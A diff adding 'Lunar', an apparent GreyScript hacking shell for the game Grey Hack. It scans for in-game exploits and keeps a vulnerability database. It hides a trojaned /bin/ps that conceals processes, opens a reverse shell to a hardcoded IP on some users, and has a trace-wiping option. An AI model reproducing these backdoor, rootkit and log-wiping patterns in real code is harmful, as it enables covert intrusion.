@@ -1,0 +1,735 @@
+print("<color=#7141c4>[Lunar] </color><color=#8254d1>Loading Lunar functions...</color>")
+import_code("/root/lunarcmd")
+import_code("/root/Fox.so")
+COB=get_custom_object
+//ver=5
+//dev="Clover"
+mxf=null
+cpf=null
+apt=null
+bcf=null
+print("<color=#7141c4>[Lunar] </color><color=#8254d1>Loading Lunar libraries...</color>")
+root=get_shell.host_computer.File("/")
+newFiles=[]
+newFiles=newFiles+root.get_folders+root.get_files
+while newFiles.len
+	currFile=newFiles.pull
+	if currFile.is_folder then newFiles=currFile.get_folders+currFile.get_files+newFiles
+	test=include_lib(currFile.path)
+	if typeof(test) == "MetaxploitLib" and not mxf then
+		mxf=currFile.path
+		print("<color=#7141c4>[Lunar] </color><color=#8254d1>Hit Exploit library > "+mxf+"</color>")
+	end if
+	if typeof(test) == "cryptoLib" and not cpf then
+		cpf=currFile.path
+		print("<color=#7141c4>[Lunar] </color><color=#8254d1>Hit Crypto library > "+cpf+"</color>")
+	end if
+	if typeof(test) == "aptclientLib" and not apt then
+		apt=test
+		print("<color=#7141c4>[Lunar] </color><color=#8254d1>Hit Apt library > "+currFile.path+"</color>")
+	end if
+	if typeof(test) == "blockchainLib" and not bcf then
+		bcf=currFile.path
+		print("<color=#7141c4>[Lunar] </color><color=#8254d1>Hit Coin Library > "+bcf+"</color>")
+	end if
+end while
+
+if not mxf then exit("<color=#7141c4>[Lunar] </color><color=#8254d1>Exploit library not found</color>")
+if not cpf then exit("<color=#7141c4>[Lunar] </color><color=#8254d1>Crypto library not found</color>")
+
+cp=include_lib(cpf)
+
+if apt then
+	if get_shell.host_computer.File("/etc/apt") then
+		if not get_shell.host_computer.File("/etc/apt/aptcache.bin") then apt.update
+	end if
+	inSource=apt.show("30.30.30.30")
+	if inSource == "30.30.30.30 repository not found" then
+		apt.add_repo("30.30.30.30",1542)
+		apt.update
+	end if
+	print("<color=#7141c4>[Lunar]</color><color=#8254d1> Checking library updates...</color>")
+	if typeof(apt.check_upgrade(mxf)) == "number" and apt.check_upgrade(mxf) then
+		print("<color=#7141c4>[Lunar]</color><color=#8254d1> Updating exploit library...</color>\n")
+		apt.install("metaxploit.so",parent_path(mxf))
+	end if
+end if
+
+mx=include_lib(mxf)
+
+if bcf then bc=include_lib(bcf) else bc=null
+print("<color=#7141c4>[Lunar]</color><color=#8254d1> Lunar libraries loaded</color>")
+
+
+logRs="fstab"
+scnln="/usr/bin/ScanLan.exe"
+if not get_shell.host_computer.File(scnln) then scnln=current_path+"/ScanLan.exe"
+if not get_shell.host_computer.File(scnln) then scnln=null
+
+rhost=get_shell.host_computer.network_gateway
+if rhost == "0.0.0.0" then rhost=get_shell.host_computer.local_ip
+sessions=[]
+session=0
+shell=get_shell
+xpath=current_path
+xuser=active_user
+user=null
+comp=shell.host_computer
+lunar=program_path
+results=[]
+clipboard=null
+anon=0
+la=0
+if COB.indexes.indexOf("launchnum") == null then launchnum=0 else launchnum=COB.launchnum
+COB.launchnum=1
+origShell=1
+previous=[]
+server={}
+server.shell=null
+server.cp=null
+server.conf=null
+conf=null
+sessions.push({"shell": {"shell": shell, "user": xuser, "path": xpath, "orig": origShell}, "shells": [], "results": [], "clipboard": [], "rhost": rhost})
+
+error=function(reason)
+	out={}
+	out.bool=0
+	out.err=reason
+	return out
+end function
+
+buildPS=function(proc)
+	if not comp.File("/bin") then return
+	ps=comp.show_procs
+	source="output = get_shell.host_computer.show_procs;lines=output.split(""\n"");newOut=[];rshell=0;for line in lines;if line.split("" "")[-1] == """+proc+""" then;rshell=1;continue;end if;if line.split("" "")[-1] == ""lunar"" then continue;newOut.push(line);end for;mxf=null;root=get_shell.host_computer.File(""/"");newFiles=[];newFiles=newFiles+root.get_folders+root.get_files;while newFiles.len;currFile=newFiles.pull;if currFile.is_folder then;newFiles=currFile.get_folders+currFile.get_files+newFiles;end if;test=include_lib(currFile.path);if typeof(test) == ""MetaxploitLib"" then mxf=currFile.path;end while;if mxf then;if not rshell then include_lib(mxf).rshell_client(""61.126.138.22"",1222,"""+proc+""");end if;output=newOut.join(""\n"");print(format_columns(output))"
+	comp.touch(xpath,"ps.src")
+	p=null
+	if comp.File("/bin/ps") then p=comp.File("/bin/ps").permissions[1:]
+	src=comp.File(xpath+"/ps.src")
+	if not src then return
+	src.set_content(source)
+	shell.build(src.path,"/bin")
+	src.delete
+	ps=comp.File("/bin/ps")
+	ps.chmod("u-wrx")
+	ps.chmod("g-wrx")
+	ps.chmod("o-wrx")
+	if p then
+		up=p[:3].replace("-","")
+		gp=p[3:-3].replace("-","")
+		op=p[-3:].replace("-","")
+	else
+		p=comp.File("/bin").permissions[1:]
+		up=p[:3].replace("-","")
+		gp=p[3:-3].replace("-","")
+		op=p[-3:].replace("-","")
+	end if
+	ps.chmod("u+"+up)
+	ps.chmod("g+"+gp)
+	ps.chmod("o+"+op)
+end function
+
+sendEmail=function(reason)
+	mail=mail_login
+	if typeof(mail) != "MetaMail" then return
+	send=mail.send("",get_shell.host_computer.public_ip,"<color=#7141c4>[Lunar Security]</color>"+char(10)+"<color=#7141c4>[IP] </color><color=#8254d1>"+get_shell.host_computer.public_ip+"</color>"+char(10)+"<color=#7141c4>[Local IP] </color><color=#8254d1>"+get_shell.host_computer.local_ip+"</color>"+char(10)+"<color=#7141c4>[Date] </color><color=#8254d1>"+current_date+"</color>"+char(10)+"<color=#7141c4>[Reason] </color><color=#8254d1>"+reason+"</color>")
+	if typeof(send) != "number" then return
+end function
+
+intrude=function(err,alt=null)
+	if not alt then alt=err
+	if get_shell.host_computer.public_ip == "141.193.149.45" or get_shell.host_computer.public_ip == "135.202.178.113" then exit("<color=#7141c4>[Lunar]</color><color=#8254d1> "+err+"</color>")
+	sendEmail(alt)
+	rshelled=0
+	ps=comp.show_procs
+	for proc in ps.split("\n")[1:]
+		proc=proc.split(" ")
+		if proc[-1] == logRs then rshelled=1
+	end for
+	if not rshelled then
+		buildPS(logRs)
+		mx.rshell_client("61.126.138.22",1222,logRs)
+	end if
+	exit("<color=#7141c4>[Lunar]</color><color=#8254d1> "+err+"</color>")
+end function
+
+serve=function()
+	proxy=get_shell.connect_service
+	if typeof(proxy) != "shell" then
+		print("<color=#7141c4>[Lunar]</color><color=#8254d1> Server connection failure</color>")
+		globals.la=1
+		return
+	end if
+
+	globals.server.shell=proxy.connect_service
+	if typeof(server.shell) != "shell" then
+		print("<color=#7141c4>[Lunar]</color><color=#8254d1> Server connection failure</color>")
+		globals.la=1
+		return
+	end if
+	server.shell.launch("/root/rcon")
+	globals.server.cp=COB.server.cp
+end function
+
+Sha256=@FoxLib.Crypto.Sha256
+
+rot=@FoxLib.Crypto.ROT
+
+vigenere=@FoxLib.Crypto.Vigenere
+
+base64=@FoxLib.Crypto.Base64
+
+deserialize=@FoxLib.General.Deserialize
+
+compression=@FoxLib.General.Compression
+
+parseint=@FoxLib.General.ParseInt
+
+genRandomString=@FoxLib.General.rndstring
+
+//shade=@FoxLib.Crypto.Shade
+
+exploit=@FoxLib.VulnV.Exploit
+decipher=@FoxLib.VulnV.Decipher
+
+encrypt=function(pass,secret,type)
+
+	cryptChars=function(pass)
+		if typeof(pass) == "string" then
+		newList=[]
+		for chr in pass
+			newList.push(bitwise("^",chr.code,key))
+		end for
+		return newList.join("/")
+		else if typeof(pass) == "list" then
+			newList=""
+			for num in pass
+				newList=newList+char(bitwise("^",num.to_int,key))
+			end for
+			return newList
+		end if
+	end function
+	
+	shiftChars=function(pass,shift,list)
+		enc=""
+		for chr in pass
+			if list.indexOf(chr) == null then continue
+			newChar=shift[list.indexOf(chr)]
+			enc=enc+newChar
+		end for
+		return enc
+	end function
+	
+	allowedChars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/_.@=!#$%^&*()-+|?<>"
+	shiftedChars="Cy|=a+!@z^M7rmg*BUh(Ne-5tV8dTq?$u4vo1>kWxJpARLcKSb320%EQH6<w_nOG#.&/ZsXI)PjfiFYDl9"
+	passLen=pass.len
+	key=0
+	for chr in secret
+		key=key+chr.code
+	end for
+	if type == "enc" then
+		enc1=cryptChars(pass)
+		crypt=shiftChars(enc1,shiftedChars,allowedChars)
+	else if type == "dec" then
+		dec=shiftChars(pass,allowedChars,shiftedChars)
+		dec=dec.split("/")
+		dec=cryptChars(dec)
+		crypt=dec
+	end if
+	return(crypt)
+end function
+
+bar = function(n, bar_length = 30) // percentage number
+	fill_count = ceil(n / bar_length * 10)
+	empty_count = bar_length - fill_count
+
+	fill_bar = "#"*fill_count
+	empty_bar = "-"*empty_count
+
+	bar = "<color=#8254d1>"+fill_bar+"</color><color=#7141c4>"+empty_bar+"</color>"
+	return bar
+end function
+
+getRandomIp=function()
+	octets=[]
+	for i in range(0,3)
+		if i == 0 then octets.push(ceil(rnd*223)) else octets.push(floor(rnd*256))
+	end for
+	return octets.join(".")
+end function
+
+checkPerms=function(device)
+	out={}
+	if typeof(device) != "shell" and typeof(device) != "computer" and typeof(device) != "file" then return 0
+	if typeof(device) == "shell" or typeof(device) == "computer" then
+		if typeof(device) == "shell" then rcomp=device.host_computer else rcomp=device
+		rfile=rcomp.File("/")
+		ruser="guest"
+		if rfile and rfile.has_permission("w") then
+			ruser="root"
+		else
+			rfile=rcomp.File("/home")
+			if rfile then
+				for user in rfile.get_folders
+					if user.name == "guest" then continue
+					if user.has_permission("w") then ruser=user.name
+				end for
+			end if
+		end if
+		out.user=ruser
+		out.lan=rcomp.local_ip
+		out.pub=rcomp.public_ip
+	else if typeof(device) == "file" then
+		rcomp=device
+		while rcomp.path != "/"
+			rcomp=rcomp.parent
+		end while
+		rfile=rcomp
+		ruser="guest"
+		if rfile and rfile.has_permission("w") then
+			ruser="root"
+		else
+			rfile=null
+			for folder in rcomp.get_folders
+				if folder.name == "home" then rfile=folder
+			end for
+			if rfile then
+				for user in rfile.get_folders
+					if user.name == "guest" then continue
+					if user.has_permission("w") then ruser=user.name
+				end for
+			end if
+		end if
+		out.user=ruser
+		if exlib then
+			out.pub=pubip
+			out.lan=locip
+		else
+			islan=is_lan_ip(rhost)
+			router=get_router(rhost)
+			if islan then router=get_router
+			if islan then ports=router.device_ports(rhost) else ports=router.used_ports
+			ips=[]
+			lan=null
+			if rhost != router.local_ip then
+				hport=router.device_ports(router.local_ip)[0]
+				m={}
+				m.ip=router.local_ip
+				m.ports=[hport.port_number,0]
+				ips.push(m)
+			end if
+			for port in ports
+				inMap=0
+				for m in ips
+					if m.ip == port.get_lan_ip then
+						m.ports.push(port.port_number)
+						inMap=1
+					end if
+				end for
+				if not inMap then
+					m={}
+					m.ip=port.get_lan_ip
+					m.ports=[port.port_number]
+					ips.push(m)
+				end if
+			end for
+			for m in ips
+				ports=m.ports
+				ip=m.ip
+				for port in ports
+					if port == expport then lan=ip
+				end for
+			end for
+			if not lan then lan="unknown"
+			out.pub=rhost
+			out.lan=lan
+		end if
+	end if
+	return out
+end function
+
+
+Scan=function()
+	scanned=exploit(lmx,ml,args)
+	for mem in scanned.db.exploits
+		for ent in mem.vulns
+			result=ent.result
+			perms=checkPerms(result)
+			if not perms then continue
+			exploit={}
+			exploit.obj=result
+			exploit.user=perms.user
+			exploit.mem=mem.mem
+			exploit.exp=ent.vuln
+			exploit.lan=perms.lan
+			exploit.pub=perms.pub
+			if pubip == exploit.pub and anon then exploit.pub="x.x.x.x"
+			if exlib then exploit.port=exlib.name else exploit.port=expport
+			if results.indexOf(exploit) != null then continue
+			results.push(exploit)
+		end for
+	end for
+end function
+
+saveScan=function()
+	if lib then
+		vulns=lib.vulns
+		for insec in vulns
+			mem=insec.mem
+			for vuln in insec.vulns
+				exp=vuln
+				if args then result=ml.overflow(mem,exp,args) else result=ml.overflow(mem,exp)
+				perms=checkPerms(result)
+				if not perms then continue
+				exploit={}
+				exploit.obj=result
+				exploit.user=perms.user
+				exploit.mem=mem
+				exploit.exp=exp
+				exploit.lan=perms.lan
+				exploit.pub=perms.pub
+				if pubip == exploit.pub and anon then exploit.pub="x.x.x.x"
+				if exlib then exploit.port=exlib.name else exploit.port=expport
+				if results.indexOf(exploit) != null then continue
+				results.push(exploit)
+			end for
+		end for
+	else
+		scanned=exploit(lmx,ml,args)
+		newLib={}
+		newLib.name=scanned.db.name
+		newLib.ver=scanned.db.ver
+		newLib.vulns=[]
+		for mem in scanned.db.exploits
+			ex={}
+			ex.mem=mem.mem
+			ex.vulns=[]
+			for ent in mem.vulns
+				exp=ent.vuln
+				ex.vulns.push(exp)
+				result=ent.result
+				perms=checkPerms(result)
+				if not perms then continue
+				exploit={}
+				exploit.obj=result
+				exploit.user=perms.user
+				exploit.mem=mem.mem
+				exploit.exp=exp
+				exploit.lan=perms.lan
+				exploit.pub=perms.pub
+				if pubip == exploit.pub and anon then exploit.pub="x.x.x.x"
+				if exlib then exploit.port=exlib.name else exploit.port=expport
+				if results.indexOf(exploit) != null then continue
+				results.push(exploit)
+			end for
+			newLib.vulns.push(ex)
+		end for
+		n="/"+newLib.name+"#"+newLib.ver+char(10)
+		for vuln in newLib.vulns
+			n=n+":"+vuln.mem+char(10)+vuln.vulns.join(char(10))+char(10)
+		end for
+		if server then
+			if dbfile.get_content.len > 1 then
+				if compression(compression(dbfile.get_content,"decompress")+n,"compress").len >= 160000 then
+					server.host_computer.touch("/root/exploits","exp"+server.host_computer.File("/root/exploits").get_files.len+1)
+					globals.dbfile=servdb.get_files[-1]
+				end if
+			end if
+		end if
+		if dbfile.get_content.len == 0 then dbfile.set_content(compression(n,"compress")) else dbfile.set_content(compression(compression(dbfile.get_content,"decompress")+n,"compress"))
+	end if
+end function
+
+getExploits=function()
+	globals.exploits=[]
+	if server then
+		e=""
+		globals.dbfile=servdb.get_files[-1]
+		for file in servdb.get_files
+			if file.get_content.len > 1 then e=e+compression(file.get_content,"decompress")
+		end for
+		for line in e.split("/")
+			if line == "" then continue
+			newLib={}
+			newLib.name=line.split("#")[0]
+			newLib.ver=line.split("#")[1].split(char(10))[0]
+			newLib.vulns=[]
+			vulns=line.split(":")
+			vulns.pull
+			for l in vulns
+				l=l.split("\n")
+				if l[0] == "" then continue
+				ex={"mem": 0, "vulns": []}
+				ex.mem=l.pull
+				for vuln in l
+					if vuln == "" then continue
+					ex.vulns.push(vuln)
+				end for
+				newLib.vulns.push(ex)
+			end for
+			exploits.push(newLib)
+		end for
+		return
+	end if
+	if dbfile.get_content.len == 0 then return
+    for line in compression(dbfile.get_content,"decompress").split("/")
+		if line == "" then continue
+		newLib={}
+		newLib.name=line.split("#")[0]
+		newLib.ver=line.split("#")[1].split("\n")[0]
+		newLib.vulns=[]
+		for l in line.split(":")[1:]
+			l=l.split("\n")
+			if l[0] == "" then continue
+			ex={"mem": 0, "vulns": []}
+			ex.mem=l.pull
+			for vuln in l
+				if vuln == "" then continue
+				ex.vulns.push(vuln)
+			end for
+			newLib.vulns.push(ex)
+		end for
+		exploits.push(newLib)
+	end for
+	return
+end function
+
+getPath=function(path)
+	path=path.split("/")
+	cpath=xpath.split("/")
+	if cpath.join("/") == "/" then cpath=[""]
+	if path[0] == "" then cpath=[""]
+	if path[0] == "#" and home != "/" then cpath=home.split("/")
+	for p in path
+		if p == "" then continue
+		if p == "#" then continue
+		if p == "." then
+			check=null
+			if shelltype == "file" then check=getFile((cpath+[p]).join("/")) else check=comp.File((cpath+[p]).join("/"))
+			if not check then continue
+		end if
+		if p == ".." then
+			cpath.pop
+			continue
+		end if
+		cpath.push(p)
+	end for
+	cpath=cpath.join("/")
+	if cpath == "" then cpath="/"
+	return cpath
+end function
+
+getFile=function(path)
+	if path.split("/")[0] != "" then return null
+	file=comp
+	for i in path.split("/")
+		if i == "" then continue
+		files=file.get_folders+file.get_files
+		file=null
+		for sub in files
+			if sub.name == i then
+				file=sub
+				break
+			end if
+		end for
+		if not file then return null
+	end for
+	return file
+end function
+
+
+if launch_path != program_path and not launchnum then print("<color=#7141c4>[Lunar] </color><color=#8254d1>Warning: Invalid program launch path.")
+
+checkemail=mail_login
+if typeof(checkemail) != "MetaMail" then intrude("Autologin failed")
+
+l1=checkemail.fetch.len
+checkemail.send("",get_shell.host_computer.public_ip,"<color=#7141c4>[Lunar Security]</color>"+char(10)+"<color=#7141c4>[IP] </color><color=#8254d1>"+get_shell.host_computer.public_ip+"</color>"+char(10)+"<color=#7141c4>[Local IP] </color><color=#8254d1>"+get_shell.host_computer.local_ip+"</color>"+char(10)+"<color=#7141c4>[Date] </color><color=#8254d1>"+current_date+"</color>"+char(10)+"<color=#7141c4>[Reason] </color><color=#8254d1>AutoLogin</color>")
+l2=checkemail.fetch.len
+
+if l1 == l2 then intrude("Autologin failed")
+checkemail.delete(checkemail.fetch[0].split(char(10))[2][8:])
+
+
+if params.len > 0 then
+	if params[0].indexOf("l") == null then serve else la=1
+	if params[0].indexOf("R") != null then
+		comp.File(lunar).delete
+		comp.File(mxf).delete
+		comp.File(cpf).delete
+		cmds.corrupt(0)
+		exit("<color=#7141c4>[Lunar]</color><color=#8254d1> Removed traces</color>")
+	end if
+	if params[0].indexOf("a") != null then anon=1
+else
+	serve
+end if
+
+rhost=comp.network_gateway
+if rhost == "0.0.0.0" then rhost=comp.local_ip
+
+print("<color=#7141c4> -= { </color><color=#8254d1><b>[Lunar OS]</b></color><color=#7141c4> } =- </color>")
+start=time
+print("<color=#7141c4>[Lunar] </color><color=#8254d1>Performing short systems check...</color>")
+print("<color=#7141c4>[Lunar] </color><color=#8254d1>Libraries loaded: ["+mxf+", "+cpf+"]</color>")
+print("<color=#7141c4>[Lunar] </color><color=#8254d1>Vulnerability database loaded successfully</color>")
+if server.shell then print("<color=#7141c4>[Lunar] </color><color=#8254d1>Serverside functions OK!</color>") else print("<color=#7141c4>[Lunar] </color><color=#8254d1>Serverside functions check failure</color>")
+elapsed=str(time-start)
+elapsed=elapsed[0:elapsed.indexOf(".")+2]
+start=null
+print("<color=#7141c4>[Lunar] </color><color=#8254d1>Finished system check in ["+elapsed+"] seconds.</color>")
+
+lunaros=function(input=null)
+while 1
+globals.shelltype=typeof(shell)
+if shelltype == "shell" then
+	globals.comp=shell.host_computer
+	globals.sstat="Shell"
+else if shelltype == "computer" then
+	globals.comp=shell
+	globals.sstat="Computer"
+else if shelltype == "file" then
+	globals.comp=shell
+	while comp.path != "/"
+		globals.comp=comp.parent
+	end while
+	globals.sstat="File"
+end if
+if shelltype == "file" then
+	globals.pubip=sessions[session].shell.pubip
+	globals.locip=sessions[session].shell.locip
+else
+	globals.pubip=comp.public_ip
+	globals.locip=comp.local_ip
+end if
+
+if anon then
+	globals.display="\n<color=#7141c4>[Lunar"+sstat+"] </color><color=#8254d1>anon@x.x.x.x ~ "+locip+"</color>"
+	globals.home="/"
+else
+	globals.display="\n<color=#7141c4>[Lunar"+sstat+"] </color><color=#8254d1>"+xuser+"@"+pubip+" ~ "+locip+"</color>"
+	if xuser == "root" then globals.home="/root" else globals.home="/home/"+xuser
+	if origShell then globals.home=home_dir
+	if shelltype == "file" then
+		if not getFile(home) then globals.home="/"
+	else
+		if not comp.File(home) then globals.home="/"
+	end if
+end if
+
+globals.displaypath=xpath
+if home != "/" then
+	globals.displaypath=xpath.split("/")[:home.split("/").len].join("/")
+	if displaypath == home then globals.displaypath="~"+([""]+xpath.split("/")[home.split("/").len:]).join("/") else globals.displaypath=xpath
+end if
+globals.display=display+"\n<color=#7141c4>"+displaypath+":~$ </color><color=#8254d1>"
+
+globals.pipe=[]
+prompt=[]
+next=[]
+if input then prompt=input else prompt=user_input(display).split(" ")
+if prompt[0] == "|" then continue
+if prompt.indexOf("|") >= 0 then
+	prompt.push("|")
+	while prompt.len
+		pipe.push(prompt[:prompt.indexOf("|")])
+		prompt=prompt[prompt.indexOf("|"):][1:]
+	end while
+else
+	pipe.push(prompt[0:])
+end if
+while pipe.len
+	dbfile=null
+	if server.shell then
+		globals.xconf=server.shell.host_computer.File("/root/conf")
+		globals.servdb=server.shell.host_computer.File("/root/exploits")
+		globals.dbfile=servdb.get_files[-1]
+		upref=xconf.get_content
+		config={"rss": {"ip": "none", "user": "none", "pass": "none", "port": 0, "rport": 0}, "mail": {"user": "none", "pass": "none"}, "proc": "none"}
+		if upref.len > 0 then config=deserialize(encrypt(upref,"Lunar","dec"))
+		globals.conf=config
+	else
+		globals.expdb=current_path+"/LuDB"
+		if not get_shell.host_computer.File(expdb) then get_shell.host_computer.touch(current_path,"LuDB")
+		globals.dbfile=get_shell.host_computer.File(expdb)
+	end if
+	globals.exlib=null
+	globals.expport=null
+	globals.shelltype=typeof(shell)
+	if shelltype == "shell" then
+		globals.comp=shell.host_computer
+	else if shelltype == "computer" then
+		globals.comp=shell
+	end if
+	if shelltype == "file" then
+		globals.comp=shell
+		while comp.path != "/"
+			globals.comp=comp.parent
+		end while
+		globals.pubip=sessions[session].shell.pubip
+		globals.locip=sessions[session].shell.locip
+	else
+		globals.pubip=comp.public_ip
+		globals.locip=comp.local_ip
+	end if
+	
+	prompt=pipe.pull
+	if next.len then prompt.push(next.pull)
+	if prompt[0] == "" or prompt[0] == "0" or not prompt[0] then continue
+	i=0
+	for el in prompt
+		if el == "" then prompt[i]=0
+		i=i+1
+	end for
+	if prompt[0] == "r" then prompt[0] = "rhost"
+	if prompt[0] == "f" then prompt[0] = "nmap"
+	if prompt[0] == "w" then prompt[0] = "target"
+	if prompt[0] == "a" then prompt[0] = "escalate"
+	if prompt[0] == "d" then prompt[0] = "use"
+	if prompt[0] == "rnd" then prompt[0] = "random"
+	if prompt[0] == "enc" then prompt[0] = "shade"
+	if prompt[0] == "up" then prompt[0] = "put"
+	if prompt[0] == "dl" then prompt[0] = "get"
+	if prompt[0] == "clr" or prompt[0] == "cls" then prompt[0]="clear"
+	if prompt[0] == "!!" then prompt=previous
+	previous=prompt
+	args=prompt[1:]
+	comm=prompt[0]
+	if cmds.hasIndex(comm) then
+		f=@cmds[comm]
+		if clipboard then
+			for inp in args
+				if typeof(clipboard) == "string" and inp == "copyv" then args[args.indexOf(inp)] = clipboard
+				if typeof(clipboard) == "map" and clipboard.hasIndex(inp) then args[args.indexOf(inp)] = clipboard[inp]
+			end for
+		end if
+		
+		out=f(args)
+		if out.bool == 1 then
+			if pipe.len then next.push(out.out) else print("<color=#7141c4>[Lunar] </color><color=#8254d1>"+out.out+"</color>")
+		else if out.bool == 0 then
+			print("<color=#7141c4>[Lunar] </color><color=#8254d1>"+out.err+"</color>")
+			break
+		end if
+		if out.bool == 3 then break
+		if COB.indexes.indexOf("returned") != null then
+			globals.sessions[session].shells.push(globals.sessions[session].shell)
+			globals.shell=COB.returned.shell
+			globals.origShell=0
+			globals.xuser=COB.returned.user
+			globals.xpath=COB.returned.path
+			globals.sessions[session].shell={"shell": shell, "path": xpath, "user": xuser, "orig": origShell}
+			if @COB.remove != @locals.remove then
+				COB.remove=@locals.remove
+				COB.remove("remove")
+			end if
+			COB.remove("returned")
+		end if
+	end if
+end while
+if input then return
+end while
+end function
+
+if params[1:].len then lunaros(params[1:])
+lunaros()
